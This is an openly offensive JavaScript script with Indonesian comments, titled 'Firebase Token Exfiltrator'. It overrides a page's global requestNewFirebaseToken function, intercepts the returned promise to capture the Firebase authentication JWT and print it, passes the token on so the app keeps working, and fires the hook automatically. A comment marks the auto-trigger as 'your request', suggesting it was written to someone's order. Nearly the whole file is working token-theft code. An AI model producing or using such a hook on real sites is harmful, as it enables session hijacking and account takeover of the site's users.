/**
 * =============================================================================
 *  Firebase Token Exfiltrator v2 (Auto-Triggered)
 * =============================================================================
 * Berdasarkan Intelijen dari Deep Inspector:
 * - Target: Fungsi 'requestNewFirebaseToken' yang ada secara global.
 * - Mekanisme: Mencegat Promise yang dikembalikan untuk mencuri token.
 * - Peningkatan: Serangan sekarang dipicu secara otomatis setelah hook aktif.
 * =============================================================================
 */

(function() {
    // Verifikasi bahwa target kita ada sebelum melancarkan serangan
    if (typeof log === 'undefined' || typeof window.requestNewFirebaseToken !== 'function') {
        log.error("GAGAL: Fungsi target 'requestNewFirebaseToken' tidak ditemukan. Serangan dibatalkan.");
        return;
    }

    log.info("---[ Mempersiapkan Serangan Firebase Token Exfiltrator ]---");

    // 1. Simpan referensi ke fungsi asli
    const originalRequestToken = window.requestNewFirebaseToken;
    log.info("Referensi ke fungsi asli 'requestNewFirebaseToken' berhasil disimpan.");

    // 2. Timpa fungsi global dengan versi kita
    window.requestNewFirebaseToken = function(...args) {
        log.warn("!!! FUNGSI 'requestNewFirebaseToken' BERHASIL DICEGAT !!!");
        
        // 3. Panggil fungsi asli untuk memulai proses otentikasi yang sah
        log.info("Memanggil fungsi asli untuk mendapatkan promise token...");
        const promiseOfToken = originalRequestToken.apply(this, args);

        // 4. Mencegat hasil dari Promise
        return promiseOfToken.then(token => {
            log.success("\n\n---======================================---");
            log.success("   💎💎💎 TOKEN OTENTIKASI BERHASIL DICURI 💎💎💎");
            log.success("---======================================---");
            
            log.warn("TOKEN (JWT):");
            log._append(token, 'var(--color-success)', 'JWT>');

            log.info("\nSerangan berhasil. Mengembalikan token asli agar aplikasi tidak crash...");

            // 5. Kembalikan token asli agar alur aplikasi tidak terganggu
            return token;
        }).catch(err => {
            log.error("Terjadi error saat mencoba mendapatkan token. Ini juga informasi berharga.");
            log.error(err);
            throw err;
        });
    };

    log.success("Hook pada 'requestNewFirebaseToken' telah aktif.");

    // --- [PERMINTAAN ANDA] Pemicu Otomatis ---
    log.warn("\nMemulai pemicu otomatis untuk mendapatkan token baru SEKARANG...");
    
    // 6. Panggil fungsi yang telah kita bajak untuk memicu serangan secara otomatis.
    requestNewFirebaseToken();
    // --- Akhir dari Pemicu Otomatis ---

})();